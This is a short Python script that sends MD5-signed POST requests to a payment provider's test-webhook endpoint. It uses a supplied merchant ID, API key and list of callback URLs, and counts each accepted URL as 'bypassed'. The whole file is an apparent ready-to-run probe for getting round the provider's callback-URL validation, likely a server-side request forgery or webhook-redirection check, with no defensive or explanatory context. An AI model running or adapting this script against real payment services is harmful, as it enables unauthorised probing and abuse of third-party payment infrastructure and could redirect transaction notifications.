import json, hashlib, base64, urllib.request

def run(**kwargs):
    base = kwargs.get("base", "https://payment.duskyr.com/v1/test-webhook/payment")
    merchant = kwargs.get("merchant")
    api_key = kwargs.get("api_key")
    callbacks = kwargs.get("callbacks") or []
    results = []
    for cb in callbacks:
        body = json.dumps({"currency": "USDT", "network": "bep20", "url_callback": cb}, separators=(",", ":"))
        b64 = base64.b64encode(body.encode()).decode()
        sign = hashlib.md5((b64 + api_key).encode()).hexdigest()
        req = urllib.request.Request(base, data=body.encode(), method="POST")
        req.add_header("Content-Type", "application/json")
        req.add_header("merchant", merchant)
        req.add_header("sign", sign)
        try:
            with urllib.request.urlopen(req, timeout=15) as r:
                results.append({"callback": cb, "status": r.status, "body": r.read(200).decode(errors="replace")})
        except urllib.error.HTTPError as e:
            results.append({"callback": cb, "status": e.code, "body": e.read(200).decode(errors="replace")})
        except Exception as e:
            results.append({"callback": cb, "status": "ERR", "body": str(e)[:120]})
    bypassed = [r for r in results if r["status"] == 200]
    return json.dumps({"tested": len(results), "bypassed": len(bypassed), "results": results}, indent=1)
